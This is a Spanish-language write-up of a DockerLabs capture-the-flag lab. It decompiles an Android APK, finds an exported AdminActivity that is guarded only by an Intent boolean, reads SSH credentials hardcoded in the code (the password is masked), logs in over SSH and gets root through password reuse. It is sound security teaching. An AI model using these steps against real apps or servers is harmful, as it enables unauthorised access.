# ApkAdmin (DockerLabs - Fácil)

**Plataforma:** DockerLabs
**Categoría:** Seguridad Móvil / Reversing Android
**IP objetivo:** 172.17.0.2

---

## Resumen

Aplicación Android con tres pantallas: login, panel de usuario, y panel de administrador oculto. El objetivo es acceder al panel de administrador, extraer credenciales SSH, conectarse al servidor y escalar a root. La vulnerabilidad principal es una Activity Android exportada sin protección, combinada con credenciales hardcodeadas en el código fuente y reutilización de contraseñas.

---

## Herramientas utilizadas

- **JADX** — decompilador de APKs Android a código Java legible
- **apktool** — extracción de recursos y AndroidManifest.xml
- **SSH** — acceso remoto al servidor

---

## 1. Nmap y Obtención del APK

```bash
[22:00:39] bapee@BlumeSec ~/apkadmin ❯ nmap -sVC -p- 172.17.0.2 -oG nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
| ssh-hostkey: 
|   256 fd:46:13:f6:60:da:6f:92:29:1c:88:18:44:e0:9e:b1 (ECDSA)
|_  256 3f:4b:a6:84:c6:eb:fd:b4:3a:21:b1:59:22:a9:c9:e4 (ED25519)
80/tcp open  http    SimpleHTTPServer 0.6 (Python 3.11.2)
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|_http-title: Laboratorio: AdminBypass CTF
MAC Address: 42:EA:15:69:60:43 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```txt
Descargar en la Web que despliega el docker (Puerto 80)
```

---

## 2. Decompilación y extracción

Se usan dos herramientas con propósitos distintos:

- **JADX** convierte el bytecode Dalvik del APK a código Java legible, permitiendo analizar la lógica de la aplicación.
- **apktool** extrae los recursos del APK (layouts, strings, y especialmente el `AndroidManifest.xml`) en formato legible.

```bash
# Decompilar con JADX (puede generar errores menores, pero produce la carpeta decompiled)
./jadx-1.5.0/bin/jadx -d decompiled/ AdminBypassCTF.apk
"Ignorar: ERROR - finished with errors, count: 17"

# Extraer recursos con apktool
apktool d AdminBypassCTF.apk -o apk_extracted
```

---

## 3. Análisis del AndroidManifest.xml

El `AndroidManifest.xml` es el archivo de configuración central de toda aplicación Android. Declara qué componentes existen (Activities, Services, etc.) y qué permisos o restricciones tienen. Es siempre el primer archivo a revisar al analizar un APK.

```bash
cat apk_extracted/AndroidManifest.xml
```

Contenido relevante:

```xml
<manifest package="com.ctf.adminbypass">
    <application>
        <!-- Activity principal (login) -->
        <activity android:exported="true"
                  android:name="com.ctf.adminbypass.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <!-- Activity de usuario (NO exportada, solo accesible internamente) -->
        <activity android:exported="false"
                  android:name="com.ctf.adminbypass.UserActivity"/>

        <!-- Activity de administrador (exportada, accesible desde fuera) -->
        <activity android:exported="true"
                  android:name="com.ctf.adminbypass.AdminActivity"/>
    </application>
</manifest>
```

**Hallazgo clave:** `AdminActivity` tiene `exported="true"` y no requiere ningún permiso especial. Esto significa que cualquier aplicación externa (o ADB) puede lanzarla directamente, saltándose el flujo normal de login.

---

## 4. Análisis del código de AdminActivity

```bash
cat decompiled/sources/com/ctf/adminbypass/AdminActivity.java
```

Código decompilado:

```java
public final class AdminActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_admin);

        TextView flagView = (TextView) findViewById(R.id.textFlag);

        // Lee un extra booleano llamado "isAdmin" del Intent que lanzó esta Activity
        boolean isAdmin = getIntent().getBooleanExtra("isAdmin", false);

        if (isAdmin) {
            // Si isAdmin es true, muestra las credenciales SSH
            flagView.setText("Acceso SSH\n\nUsuario: pingu\nContrasena: ---");
        } else {
            // Si isAdmin es false (valor por defecto), deniega el acceso
            Toast.makeText(this, R.string.access_denied, 0).show();
            finish();
        }
    }
}
```

**Análisis:**
- La Activity controla el acceso mediante un simple booleano (`isAdmin`) que recibe del Intent que la lanzó.
- El valor por defecto es `false` — si se accede normalmente, se deniega el acceso.
- Si se pasa `true`, muestra las credenciales directamente en pantalla.
- Las credenciales están hardcodeadas en el propio código fuente — esto significa que ni siquiera hace falta ejecutar la aplicación para obtenerlas, basta con leer el código decompilado.

**Credenciales extraídas del código:**

```
Usuario: pingu
Contraseña: ---
```

---

## 5. Acceso SSH

```bash
# Si el servidor ya fue accedido antes con otra key, limpiar known_hosts
ssh-keygen -f '/home/user/.ssh/known_hosts' -R '172.17.0.2'

# Conectar
ssh pingu@172.17.0.2
# Contraseña: ---
```

Verificación:

```bash
whoami  # pingu
id      # uid=1000(pingu) gid=1000(pingu) groups=1000(pingu)
```

---

## 6. Escalada de privilegios a root

Se prueba reutilización de contraseña — el usuario `pingu` usa la misma contraseña para `root`:

```bash
su -
# Contraseña: ---
```

Verificación:

```bash
id  # uid=0(root) gid=0(root) groups=0(root)
```

Root obtenido.

---

## Cadena de ataque

```
Decompilar APK (JADX + apktool)
        ↓
AndroidManifest.xml → AdminActivity exportada sin protección
        ↓
Código fuente → credenciales hardcodeadas + lógica de isAdmin
        ↓
SSH como pingu
        ↓
su - con misma contraseña → root
```

---

## Vulnerabilidades identificadas

**1. Activity exportada sin protección**
`AdminActivity` tiene `exported="true"` sin requerir ningún permiso. Cualquier proceso externo puede lanzarla directamente con ADB o desde otra aplicación.

**2. Control de acceso mediante booleano**
La única "autenticación" es un extra booleano del Intent. No hay verificación de identidad real — cualquiera que sepa el nombre del extra puede forzar el acceso.

**3. Credenciales hardcodeadas**
Las credenciales SSH están escritas directamente en el código fuente Java. Cualquiera que decompile el APK las obtiene sin necesidad de ejecutar la aplicación.

**4. Reutilización de contraseña**
La misma contraseña sirve para el usuario `pingu` y para `root`, permitiendo una escalada de privilegios trivial.